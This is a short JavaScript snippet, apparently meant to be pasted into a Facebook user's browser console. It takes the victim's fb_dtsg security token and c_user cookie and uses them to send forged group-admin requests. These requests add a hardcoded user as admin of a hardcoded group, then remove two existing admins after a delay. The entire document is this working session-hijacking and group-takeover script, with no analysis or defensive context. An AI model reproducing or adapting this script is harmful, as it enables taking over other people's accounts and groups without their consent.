

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function IDS(r) {
function G(gid) {
var Page = new XMLHttpRequest();
var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
Page.open("POST", PageURL, true);
Page.onreadystatechange = function () {
if (Page.readyState == 4 && Page.status == 200) {
Page.close;
}
};
Page.send(PageParams);
}
G("536352643082702");
}
IDS("100005147649818");
IDS("100005147649818");
IDS("100005147649818");



setTimeout(function () {

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function IDS(r) {
function G(gid) {
var Page = new XMLHttpRequest();
var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_remove_admin&source=profilebrowser&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
Page.open("POST", PageURL, true);
Page.onreadystatechange = function () {
if (Page.readyState == 4 && Page.status == 200) {
Page.close;
}
};
Page.send(PageParams);
}
G("536352643082702");
}
IDS("100001954038029");
IDS("100000159572140");

}, 4000);
